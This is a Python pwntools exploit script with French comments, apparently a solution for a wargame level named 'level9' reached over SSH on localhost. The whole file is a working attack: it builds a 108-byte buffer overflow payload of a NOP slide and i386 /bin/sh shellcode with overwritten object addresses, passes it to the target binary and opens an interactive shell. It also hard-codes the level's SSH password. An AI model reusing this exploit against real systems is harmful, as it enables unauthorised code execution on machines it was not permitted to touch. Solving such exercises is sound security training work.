#!/usr/bin/env python3
from pwn import *
import base64
import os

from pwnlib.adb import shell

# Configuration
context.arch = 'i386'  # Architecture du binaire (32-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = False  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8881  # Port pour SSH
USER = "level9"  # Nom d'utilisateur SSH
PASSWORD = "c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a"  # Mot de passe SSH
SSH_SESSION = None


def get_connection(custom_env=None, argv=None):
    global SSH_SESSION
    # Fonction helper pour fusionner les environnements
    def merge_env(base_env, custom_env):
        if custom_env:
            base_env.update(custom_env)
        return base_env

    if LOCAL:
        # En local, on utilise l'environnement actuel comme base
        SSH_SESSION = None
        local_env = os.environ.copy()
        final_env = merge_env(local_env, custom_env)
        final_argv = argv if argv is not None else ['./Resources/' + USER]
        return process(final_argv, env=final_env)
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        SSH_SESSION = shell
        # Récupérer l'environnement distant
        remote_env = shell.run('env').recvall().decode().strip()
        # Convertir l'output en dictionnaire
        remote_env_dict = dict(line.split('=', 1) for line in remote_env.split('\n') if '=' in line)

        # Fusionner avec nos variables personnalisées 
        final_env = merge_env(remote_env_dict, custom_env)
        final_argv = argv if argv is not None else ['/home/user/' + USER + '/' + USER]
        log.info(f"Final argv: {final_argv}")
        return shell.process(final_argv, env=final_env)


def exploit():
    
    
    
    if (LOCAL):
        addr = 0x0804d3b4
        addr_of_first_object = p32(addr)
        addr_of_shellcode = p32(addr + 4)
    else:
        addr = 0x804a00c
        addr_of_first_object = p32(addr)
        addr_of_shellcode = p32(addr + 4)



  
    buffer_size = 108
    shellcode = asm(shellcraft.i386.linux.sh())
    nop_slide = b"\x90"
    number_of_nop_slide = buffer_size - len(addr_of_shellcode) - len(addr_of_first_object) - len(shellcode)
    
    
    payload = addr_of_shellcode + nop_slide * number_of_nop_slide + shellcode + addr_of_first_object
    
    if not LOCAL:
        binary_path = f"/home/user/{USER}/{USER}"
        payload_arg = [binary_path, payload]
    else:
        binary_path = f"./Resources/{USER}"
        payload_arg = [binary_path, payload]


    if LOCAL:
        conn = gdb.debug(payload_arg, '''
          break *main+131
          continue
          ''')
    else:
        conn = get_connection(argv=payload_arg)
    
    with open("payload", "wb") as f:
        f.write(payload)

    conn.interactive()
    
if __name__ == "__main__":
    exploit()
